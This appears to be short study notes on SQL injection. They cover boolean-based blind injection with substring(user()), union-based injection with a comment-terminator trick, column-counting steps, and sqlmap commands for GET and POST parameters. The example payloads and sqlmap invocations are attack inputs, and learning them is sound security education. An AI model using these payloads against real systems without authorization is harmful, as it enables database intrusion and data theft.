# SQL Injection

### Boolean Based Blind SQLi

#### user()

It returns name of user currently using the db

#### substring()

It returns a substring of given argument. It takes 3 parameters i.e input string, position of substring and its length.

#### Example

```sql
select substring(user(), 1, 1) = 'r'; // True since username is root
select substring(user(), 1, 1) = 'a'; // False
```

We can iterate over letters of the username by using payloads such as

```sql
' or substring(user(), 1, 1) = 'a
' or substring(user(), 2, 1) = 'b
```



### Union Based SQLi

Our target is to make the original query payload empty and using our own payload

```sql
Select description from items where id='' UNION Select user(); -- -
```

* We used a trick i.e third dash after **two dashes and a space**
* This is because most browsers auto remove trailing spaces in the URL, so u add a character after the space

#### Steps to find fields

1. use NULL to find out no of columns
2. use different data types to find out type of data returned



### SQLMap

It automates the whole process

#### Get Parameter

```bash
sqlmap -u 'http://website.com/view.php?id=123' -p id --technique=U
```

* \-p tells us which parameter to check
* technique used is Union based attacks

#### Post Parameter

```bash
sqlmap -u <url> --data=<POST STRING> -p parameter --technique=B
```

* technique used is boolean

